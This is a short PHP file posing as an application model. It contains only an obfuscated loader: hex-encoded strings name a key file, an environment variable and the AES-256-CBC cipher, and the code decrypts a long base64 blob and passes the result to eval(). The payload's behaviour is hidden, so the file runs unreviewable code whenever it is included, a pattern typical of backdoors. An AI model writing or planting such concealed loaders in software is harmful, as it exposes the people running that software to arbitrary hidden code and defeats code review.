<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('UWGXsNAHiL+G9jGo/Lj8sQ==');

$c=base64_decode(

'2fA0ryixXTVio85KiZaI2uo15U0r6Sxq+jRl1iEpcbVFO2zwdf1ytJLw20kcckM0Uam+35jHqIUJ' .
'qO0caH0wbhQmn14BFjjzA4I64mHk9D3rmvVmZ4bu026V1Z/wC9sLXIxaYGyd8nl0Ek6hGIbtBknh' .
'mPTLFToC5a0KFlY9QfQ5pfxVALP/Z1q0w8d9FUcsywoAxR/UbezCHgB8zOakarWIK1WllYH5CG16' .
'94mGvHRS9VKF2O4eOzc/r1TXyQaFdoMOfpmW/zSoYnhyVvQ8YS5QlvQU2nWiuRGd4sIAY+a2v5Ao' .
'c/5W1lU80wrAN8aZ0nAQKs/M3GUug+q1uxicZT0sBUPn0q4m1w4TIcYisO3yLbsRbeVeM5uedFbB' .
'GXoOw1pp78w5lD1dtD8q4Hx4X09W3NbhVrBis6yApCIZnZMO2HOiqxorxZZkvgoW9cDEA6qp/b9w' .
'cVTu7WQmxJ7SsSxDC1N+3ABT8QLc3LRB1xOpjrcVA9GekIuvHQr5KOF6iQngrGpadjS7LveTrE/h' .
'xJMas4Z3teXa4FYH7ObSAqlIbXL6tdHz0H8SqhacPpc0it2gVwDpjR3h0vz95O34rnFJGIYNKKtA' .
'6Foc/nVvU9FVJp0IySw2G4Z+yDszhhHXsHRLiVNp9RsMMYmqb1ELEh6eD9tptBwlCnTs45ZSXghj' .
'Yo4lOFZ/FSWxbUPsl1LDHYXQJ3qYGKkoH9T830jTpWzeiEQuRK96Go7ZIjC0bzKGDXKVUx6lZjgg' .
'jZAQYUJQG0k8IYuKZ9qF0ot8JLofNt6mk45WIQaNr3ZP8j18u1gapOpg3icF4CJojwyTE5Rrwc13' .
'FipqlJGdkSaf7SFIC2SaeRx81ompM/s4rS7SQpmJGVbKutXPBIwB1DmP27HvzYSOiLlzQ7Z3avnB' .
'hC5bC6te1p6YAHwtU2jfVjAZ99bg8pJweD3PWKavEb+qAq3m+HbAQ0tQx6dH78Hc3sSpCWJONMuf' .
'0G7/D9E+vFUXyBc+HVdTNtOkmFpj4Xs+/OEXJcvn2nDN1PTX1/U1JAoiyfxQAhu7fCSq3cuBpX6m' .
'wd+6VjhUtCLWevlwV6TGXEUgjBz0eUXVJ6GPVPefyYYyVZcN5b1YsiNYsq6wLJfv4bmMAeA7Pvwm' .
'mxqf2wroeauuJbCmeM8M6JCrjNuO8RCb9ywqMhCRHw6lXXtGc81jfyGvDLUzo2B55+G6/nnbejJN'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

